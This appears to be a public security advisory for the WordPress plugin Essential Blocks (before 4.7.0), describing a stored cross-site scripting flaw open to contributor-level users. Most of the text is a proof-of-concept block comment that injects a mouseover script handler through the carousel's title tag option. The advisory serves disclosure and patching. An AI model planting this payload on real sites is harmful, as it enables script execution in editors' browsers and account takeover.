## WordPress Plugin Vulnerabilities

# Essential Blocks < 4.7.0 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its block options before outputting them back in a page/post where the block is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks

### Proof of Concept

As a contributor, put the below code in a post while in Code Editor Mode and save:
<!-- wp:essential-blocks/post-carousel {"blockId":"eb-post-carousel-15gwf","queryData":{"source":"post","sourceIndex":0,"rest\_base":"posts","rest\_namespace":"wp/v2","author":"","taxonomies":{},"per\_page":"6","offset":"0","orderby":"date","order":"desc","include":"","exclude":"","exclude\_current":false,"exclude\_password\_protected":false},"postTerms":{"category":{"label":"Categories","value":"category"},"post\_tag":{"label":"Tags","value":"123\u0022sdfsdf=''"}},"titleTag":"a onmouseover=alert(/XSS/) style='width:125px;height:123px;display:block'>","expansionIndicator":"123\u0022asdasd=''","authorPrefix":"123\u0022asdasd=''","datePrefix":"123\u0022asdasd=''","autoplaySpeed":"123\u0022sdfsdf=''","speed":"123\u0022sdfsdf=''","thumbnailImageSizeRange":"123\u0022sdfsdf=''","commonStyles":{"desktop":".wp-admin .eb-parent-eb-post-carousel-15gwf { display:block }.wp-admin .eb-parent-eb-post-carousel-15gwf { filter:unset }.wp-admin .eb-parent-eb-post-carousel-15gwf::before { content:none }.eb-parent-eb-post-carousel-15gwf { display:block }.root-eb-post-carousel-15gwf { position:relative }","tab":".editor-styles-wrapper.wp-embed-responsive .eb-parent-eb-post-carousel-15gwf { display:block }.editor-styles-wrapper.wp-embed-responsive .eb-parent-eb-post-carousel-15gwf { filter:none }.editor-styles-wrapper.wp-embed-responsive .eb-parent-eb-post-carousel-15gwf::before { content:none }.eb-parent-eb-post-carousel-15gwf { display:block }","mobile":".editor-styles-wrapper.wp-embed-responsive .eb-parent-eb-post-carousel-15gwf { display:block }.editor-styles-wrapper.wp-embed-responsive .eb-parent-eb-post-carousel-15gwf { filter:none }.editor-styles-wrapper.wp-embed-responsive .eb-parent-eb-post-carousel-15gwf::before { content:none }.eb-parent-eb-post-carousel-15gwf { display:block }"}} /-->
The XSS will be triggered when a user will edit the post (in normal mode, not code editor) and move the mouse above the title in the generated card
